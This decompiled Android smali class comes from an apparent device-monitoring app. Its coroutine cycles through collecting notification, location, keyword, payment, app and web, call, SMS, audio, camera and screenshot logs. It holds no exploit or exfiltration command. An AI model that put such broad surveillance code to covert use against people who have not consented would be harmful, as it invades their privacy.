.class final Lt3/e$a;
.super Lkotlin/coroutines/jvm/internal/l;
.source "r8-map-id-3c9131830f0ea68ff3ab56402885f42c2f176b7b00a5ba4d07035d22808320df"

# interfaces
.implements Lwc/p;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lt3/e;->h()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x18
    name = null
.end annotation


# instance fields
.field a:I


# direct methods
.method constructor <init>(Loc/e;)V
    .locals 1

    .line 1
    const/4 v0, 0x2

    .line 2
    invoke-direct {p0, v0, p1}, Lkotlin/coroutines/jvm/internal/l;-><init>(ILoc/e;)V

    .line 3
    .line 4
    .line 5
    return-void
.end method


# virtual methods
.method public final create(Ljava/lang/Object;Loc/e;)Loc/e;
    .locals 0

    .line 1
    new-instance p1, Lt3/e$a;

    .line 2
    .line 3
    invoke-direct {p1, p2}, Lt3/e$a;-><init>(Loc/e;)V

    .line 4
    .line 5
    .line 6
    return-object p1
.end method

.method public bridge synthetic invoke(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    .locals 0

    .line 1
    check-cast p1, Lkf/c0;

    check-cast p2, Loc/e;

    invoke-virtual {p0, p1, p2}, Lt3/e$a;->invoke(Lkf/c0;Loc/e;)Ljava/lang/Object;

    move-result-object p1

    return-object p1
.end method

.method public final invoke(Lkf/c0;Loc/e;)Ljava/lang/Object;
    .locals 0

    .line 2
    invoke-virtual {p0, p1, p2}, Lt3/e$a;->create(Ljava/lang/Object;Loc/e;)Loc/e;

    move-result-object p1

    check-cast p1, Lt3/e$a;

    sget-object p2, Lkc/x;->a:Lkc/x;

    invoke-virtual {p1, p2}, Lt3/e$a;->invokeSuspend(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object p1

    return-object p1
.end method

.method public final invokeSuspend(Ljava/lang/Object;)Ljava/lang/Object;
    .locals 3

    .line 1
    invoke-static {}, Lpc/b;->e()Ljava/lang/Object;

    .line 2
    .line 3
    .line 4
    move-result-object v0

    .line 5
    iget v1, p0, Lt3/e$a;->a:I

    .line 6
    .line 7
    packed-switch v1, :pswitch_data_0

    .line 8
    .line 9
    .line 10
    new-instance p1, Ljava/lang/IllegalStateException;

    .line 11
    .line 12
    const-string v0, "call to \'resume\' before \'invoke\' with coroutine"

    .line 13
    .line 14
    invoke-direct {p1, v0}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    .line 15
    .line 16
    .line 17
    throw p1

    .line 18
    :pswitch_0
    :try_start_0
    invoke-static {p1}, Lkc/q;->b(Ljava/lang/Object;)V

    .line 19
    .line 20
    .line 21
    goto/16 :goto_b

    .line 22
    .line 23
    :catchall_0
    move-exception p1

    .line 24
    goto/16 :goto_a

    .line 25
    .line 26
    :pswitch_1
    invoke-static {p1}, Lkc/q;->b(Ljava/lang/Object;)V

    .line 27
    .line 28
    .line 29
    goto/16 :goto_8

    .line 30
    .line 31
    :pswitch_2
    invoke-static {p1}, Lkc/q;->b(Ljava/lang/Object;)V

    .line 32
    .line 33
    .line 34
    goto/16 :goto_7

    .line 35
    .line 36
    :pswitch_3
    invoke-static {p1}, Lkc/q;->b(Ljava/lang/Object;)V

    .line 37
    .line 38
    .line 39
    goto/16 :goto_6

    .line 40
    .line 41
    :pswitch_4
    invoke-static {p1}, Lkc/q;->b(Ljava/lang/Object;)V

    .line 42
    .line 43
    .line 44
    goto/16 :goto_5

    .line 45
    .line 46
    :pswitch_5
    invoke-static {p1}, Lkc/q;->b(Ljava/lang/Object;)V

    .line 47
    .line 48
    .line 49
    goto :goto_4

    .line 50
    :pswitch_6
    invoke-static {p1}, Lkc/q;->b(Ljava/lang/Object;)V

    .line 51
    .line 52
    .line 53
    goto :goto_3

    .line 54
    :pswitch_7
    invoke-static {p1}, Lkc/q;->b(Ljava/lang/Object;)V

    .line 55
    .line 56
    .line 57
    goto :goto_2

    .line 58
    :pswitch_8
    invoke-static {p1}, Lkc/q;->b(Ljava/lang/Object;)V

    .line 59
    .line 60
    .line 61
    goto :goto_1

    .line 62
    :pswitch_9
    invoke-static {p1}, Lkc/q;->b(Ljava/lang/Object;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 63
    .line 64
    .line 65
    goto :goto_0

    .line 66
    :pswitch_a
    invoke-static {p1}, Lkc/q;->b(Ljava/lang/Object;)V

    .line 67
    .line 68
    .line 69
    const/4 p1, 0x1

    .line 70
    :try_start_1
    iput p1, p0, Lt3/e$a;->a:I

    .line 71
    .line 72
    const-wide/16 v1, 0x7d0

    .line 73
    .line 74
    invoke-static {v1, v2, p0}, Lkf/k0;->a(JLoc/e;)Ljava/lang/Object;

    .line 75
    .line 76
    .line 77
    move-result-object p1

    .line 78
    if-ne p1, v0, :cond_0

    .line 79
    .line 80
    goto/16 :goto_9

    .line 81
    .line 82
    :cond_0
    :goto_0
    sget-object p1, Lt3/e;->a:Lt3/e;

    .line 83
    .line 84
    sget-object v1, Lt3/c;->NotificationLog:Lt3/c;

    .line 85
    .line 86
    const/4 v2, 0x2

    .line 87
    iput v2, p0, Lt3/e$a;->a:I

    .line 88
    .line 89
    invoke-virtual {p1, v1, p0}, Lt3/e;->i(Lt3/c;Loc/e;)Ljava/lang/Object;

    .line 90
    .line 91
    .line 92
    move-result-object p1

    .line 93
    if-ne p1, v0, :cond_1

    .line 94
    .line 95
    goto/16 :goto_9

    .line 96
    .line 97
    :cond_1
    :goto_1
    sget-object p1, Lt3/e;->a:Lt3/e;

    .line 98
    .line 99
    sget-object v1, Lt3/c;->LocationLog:Lt3/c;

    .line 100
    .line 101
    const/4 v2, 0x3

    .line 102
    iput v2, p0, Lt3/e$a;->a:I

    .line 103
    .line 104
    invoke-virtual {p1, v1, p0}, Lt3/e;->i(Lt3/c;Loc/e;)Ljava/lang/Object;

    .line 105
    .line 106
    .line 107
    move-result-object p1

    .line 108
    if-ne p1, v0, :cond_2

    .line 109
    .line 110
    goto/16 :goto_9

    .line 111
    .line 112
    :cond_2
    :goto_2
    sget-object p1, Lt3/e;->a:Lt3/e;

    .line 113
    .line 114
    sget-object v1, Lt3/c;->MoodAiAnalysis:Lt3/c;

    .line 115
    .line 116
    const/4 v2, 0x4

    .line 117
    iput v2, p0, Lt3/e$a;->a:I

    .line 118
    .line 119
    invoke-virtual {p1, v1, p0}, Lt3/e;->i(Lt3/c;Loc/e;)Ljava/lang/Object;

    .line 120
    .line 121
    .line 122
    move-result-object p1

    .line 123
    if-ne p1, v0, :cond_3

    .line 124
    .line 125
    goto :goto_9

    .line 126
    :cond_3
    :goto_3
    sget-object p1, Lt3/e;->a:Lt3/e;

    .line 127
    .line 128
    sget-object v1, Lt3/c;->KeywordsLogs:Lt3/c;

    .line 129
    .line 130
    const/4 v2, 0x5

    .line 131
    iput v2, p0, Lt3/e$a;->a:I

    .line 132
    .line 133
    invoke-virtual {p1, v1, p0}, Lt3/e;->i(Lt3/c;Loc/e;)Ljava/lang/Object;

    .line 134
    .line 135
    .line 136
    move-result-object p1

    .line 137
    if-ne p1, v0, :cond_4

    .line 138
    .line 139
    goto :goto_9

    .line 140
    :cond_4
    :goto_4
    sget-object p1, Lt3/e;->a:Lt3/e;

    .line 141
    .line 142
    sget-object v1, Lt3/c;->PayData:Lt3/c;

    .line 143
    .line 144
    const/4 v2, 0x6

    .line 145
    iput v2, p0, Lt3/e$a;->a:I

    .line 146
    .line 147
    invoke-virtual {p1, v1, p0}, Lt3/e;->i(Lt3/c;Loc/e;)Ljava/lang/Object;

    .line 148
    .line 149
    .line 150
    move-result-object p1

    .line 151
    if-ne p1, v0, :cond_5

    .line 152
    .line 153
    goto :goto_9

    .line 154
    :cond_5
    :goto_5
    sget-object p1, Lt3/e;->a:Lt3/e;

    .line 155
    .line 156
    sget-object v1, Lt3/c;->AppWebRecord:Lt3/c;

    .line 157
    .line 158
    const/4 v2, 0x7

    .line 159
    iput v2, p0, Lt3/e$a;->a:I

    .line 160
    .line 161
    invoke-virtual {p1, v1, p0}, Lt3/e;->i(Lt3/c;Loc/e;)Ljava/lang/Object;

    .line 162
    .line 163
    .line 164
    move-result-object p1

    .line 165
    if-ne p1, v0, :cond_6

    .line 166
    .line 167
    goto :goto_9

    .line 168
    :cond_6
    :goto_6
    sget-object p1, Lcom/fundot/p4bu/ii/receivers/PhoneReceiver;->a:Lcom/fundot/p4bu/ii/receivers/PhoneReceiver$a;

    .line 169
    .line 170
    invoke-virtual {p1}, Lcom/fundot/p4bu/ii/receivers/PhoneReceiver$a;->g()V

    .line 171
    .line 172
    .line 173
    sget-object p1, Lcom/fundot/p4bu/ii/receivers/SmsReceiver;->a:Lcom/fundot/p4bu/ii/receivers/SmsReceiver$a;

    .line 174
    .line 175
    invoke-virtual {p1}, Lcom/fundot/p4bu/ii/receivers/SmsReceiver$a;->g()V

    .line 176
    .line 177
    .line 178
    sget-object p1, Lt3/e;->a:Lt3/e;

    .line 179
    .line 180
    sget-object v1, Lt3/c;->RecordAudioLog:Lt3/c;

    .line 181
    .line 182
    const/16 v2, 0x8

    .line 183
    .line 184
    iput v2, p0, Lt3/e$a;->a:I

    .line 185
    .line 186
    invoke-virtual {p1, v1, p0}, Lt3/e;->j(Lt3/c;Loc/e;)Ljava/lang/Object;

    .line 187
    .line 188
    .line 189
    move-result-object p1

    .line 190
    if-ne p1, v0, :cond_7

    .line 191
    .line 192
    goto :goto_9

    .line 193
    :cond_7
    :goto_7
    sget-object p1, Lt3/e;->a:Lt3/e;

    .line 194
    .line 195
    sget-object v1, Lt3/c;->CameraLog:Lt3/c;

    .line 196
    .line 197
    const/16 v2, 0x9

    .line 198
    .line 199
    iput v2, p0, Lt3/e$a;->a:I

    .line 200
    .line 201
    invoke-virtual {p1, v1, p0}, Lt3/e;->j(Lt3/c;Loc/e;)Ljava/lang/Object;

    .line 202
    .line 203
    .line 204
    move-result-object p1

    .line 205
    if-ne p1, v0, :cond_8

    .line 206
    .line 207
    goto :goto_9

    .line 208
    :cond_8
    :goto_8
    sget-object p1, Lt3/e;->a:Lt3/e;

    .line 209
    .line 210
    sget-object v1, Lt3/c;->ScreenShotStudy:Lt3/c;

    .line 211
    .line 212
    const/16 v2, 0xa

    .line 213
    .line 214
    iput v2, p0, Lt3/e$a;->a:I

    .line 215
    .line 216
    invoke-virtual {p1, v1, p0}, Lt3/e;->j(Lt3/c;Loc/e;)Ljava/lang/Object;

    .line 217
    .line 218
    .line 219
    move-result-object p1
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 220
    if-ne p1, v0, :cond_9

    .line 221
    .line 222
    :goto_9
    return-object v0

    .line 223
    :goto_a
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    .line 224
    .line 225
    .line 226
    :cond_9
    :goto_b
    sget-object p1, Lkc/x;->a:Lkc/x;

    .line 227
    .line 228
    return-object p1

    .line 229
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_a
        :pswitch_9
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method
